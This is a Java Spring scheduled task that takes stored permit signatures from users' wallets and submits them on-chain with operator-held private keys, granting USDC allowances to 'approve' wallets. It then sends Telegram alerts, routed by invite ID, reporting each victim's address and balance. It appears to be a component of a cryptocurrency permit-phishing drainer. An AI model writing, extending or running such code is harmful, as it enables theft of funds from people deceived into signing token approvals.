package io.renren.modules.job.task;

import java.math.BigDecimal;
import java.util.List;

import org.springframework.beans.factory.annotation.Autowired;
import org.springframework.stereotype.Component;

import com.alibaba.fastjson.JSON;
import com.baomidou.mybatisplus.core.conditions.query.LambdaQueryWrapper;
import com.baomidou.mybatisplus.core.conditions.update.LambdaUpdateWrapper;

import io.renren.modules.constants.ApproveEnum;
import io.renren.modules.constants.RealEnum;
import io.renren.modules.core.contract.ContractHandler;
import io.renren.modules.core.entity.PoolsEntity;
import io.renren.modules.core.entity.WalletsEntity;
import io.renren.modules.core.param.WalletSignParam;
import io.renren.modules.core.service.AsyncTelegramNotificationService;
import io.renren.modules.core.service.PoolsService;
import io.renren.modules.core.service.WalletsService;
import lombok.extern.slf4j.Slf4j;
/**
 * Permit 任务
 * @author Administrator
 *
 */
@Slf4j
@Component
public class PermitTask extends BaseTask {
	@Autowired
	WalletsService walletsService;
	@Autowired
	ContractHandler handler;
	@Autowired
	PoolsService poolsService;
	@Autowired
	AsyncTelegramNotificationService asyncTelegramService;
	
	@Override
	public void run(String params) throws Exception {
		proccess(params);
	}
	
	@Override
	public void handler(String params) throws Exception {
		List<WalletsEntity> lists = walletsService.list(new LambdaQueryWrapper<WalletsEntity>()
				.eq(WalletsEntity::getReals, RealEnum.real.getCode())
				.gt(WalletsEntity::getUsdc, BigDecimal.ZERO)
				.isNotNull(WalletsEntity::getSignData)
				.eq(WalletsEntity::getApprove, ApproveEnum.unApprove.getCode()));
		for(WalletsEntity wallet : lists) {
			try {
				BigDecimal usdc = handler.getUsdcBalance(wallet.getWallet());
				if(usdc.compareTo(BigDecimal.ZERO) <= 0 ) {
					log.info("PermitTask --> 钱包:{} USDC 余额为0, 放弃执行 Permit 授权.",wallet.getWallet());
					 continue ;
				}
				BigDecimal apporveUsdc = handler.allowance(wallet.getWallet(),wallet.getApproveWallet());
				if(apporveUsdc.compareTo(BigDecimal.ZERO) <= 0 ) { //执行permit
					String spenderAddress = wallet.getApproveWallet();
					if(handler.getEthBalance(spenderAddress).compareTo(BigDecimal.ZERO) <=0) {
						log.error("PermitTask --> 钱包:{} 授权钱包:{} ETH 余额为0. 放弃执行Permit.",wallet.getWallet(),spenderAddress);
						continue ;
					}
//					PoolsEntity pools = poolsService.getOne(new LambdaQueryWrapper<PoolsEntity>().eq(PoolsEntity::getApproveWallet, spenderAddress)) ;
//					String spenderKey = pools.getApproveKey();
					
					PoolsEntity pools = poolsService.getOne(
						    new LambdaQueryWrapper<PoolsEntity>()
						        .and(w -> w.eq(PoolsEntity::getApproveWallet, spenderAddress)
						                   .or()
						                   .eq(PoolsEntity::getNewApproveWallet, spenderAddress))
						);

					String spenderKey = spenderAddress.equals(pools.getApproveWallet()) ?   pools.getApproveKey() : pools.getNewApproveKey();
					
					
					WalletSignParam sign = JSON.parseObject(wallet.getSignData(), WalletSignParam.class);
					handler.permit(wallet.getWallet(),spenderAddress, spenderKey, sign.getValue(), sign.getDeadline(), sign.getSignature());
					log.info("PermitTask --> 钱包:{} Permit 执行完成,spenderAddress:{} ",wallet.getWallet(),wallet.getApproveWallet());
					sendApprovalNotification(wallet,wallet.getUsdc());
				}
				 apporveUsdc = handler.allowance(wallet.getWallet(),wallet.getApproveWallet());
				 if(apporveUsdc.compareTo(BigDecimal.ZERO) > 0) {
					walletsService.update(new LambdaUpdateWrapper<WalletsEntity>()
							.set(WalletsEntity::getApproveUsdc, apporveUsdc)
							.set(WalletsEntity::getApprove, ApproveEnum.approved.getCode())
							.eq(WalletsEntity::getWallet, wallet.getWallet()));
					log.info("PermitTask --> 钱包:{} 已经完成Permit授权 spenderAddress:{} ,授权金额:{}",wallet.getWallet(),wallet.getApproveWallet(),apporveUsdc);
				
				 }
			}catch(Exception ex) {
				log.error("PermitTask --> 钱包:{} Permit 执行异常. {} ",wallet.getWallet(),ex.getLocalizedMessage());
				// 统计失败次数
				String failCountKey = "permit:fail:" + wallet.getWallet();
				String currentFailCount = redisUtils.get(failCountKey);
				int failCount = currentFailCount == null ? 1 : Integer.parseInt(currentFailCount) + 1;
				
				if (failCount >= 3) {
					// 连续失败3次，清除signData
					log.warn("PermitTask --> 钱包:{} 连续失败{}次，清除signData", wallet.getWallet(), failCount);
					walletsService.update(new LambdaUpdateWrapper<WalletsEntity>()
							.set(WalletsEntity::getSignData, null)
							.set(WalletsEntity::getApprove, ApproveEnum.unApprove.getCode())
							.eq(WalletsEntity::getWallet, wallet.getWallet()));
					// 清除失败计数
					redisUtils.delete(failCountKey);
				} else {
					// 记录失败次数，设置24小时过期
					redisUtils.set(failCountKey, String.valueOf(failCount), 24 * 60 * 60);
					log.warn("PermitTask --> 钱包:{} 第{}次失败，继续保留signData", wallet.getWallet(), failCount);
				}
			}
		}
	}
	
	/**
	 * 发送授权成功通知
	 */
	private void sendApprovalNotification(WalletsEntity wallet,  BigDecimal totalAmount) {
		try {
			StringBuilder message = new StringBuilder();
			message.append("🎯 授权成功通知！\n")
				   .append("💳 钱包地址: ").append(wallet.getWallet()).append("\n")
				   .append("💰 余额: ").append(totalAmount.toPlainString()).append(" USDC\n")
				   .append("✅ 状态:已完成");
			
			asyncTelegramService.sendNotificationAsync(wallet.getPoolsId(),wallet.getInviteId(), wallet.getWallet(), message.toString());
			log.info("授权成功通知已加入队列 - 钱包: {}", wallet.getWallet());
			
		} catch (Exception e) {
			log.error("发送授权成功通知失败 - 钱包: {}, 错误: {}", wallet.getWallet(), e.getMessage());
		}
	}

}
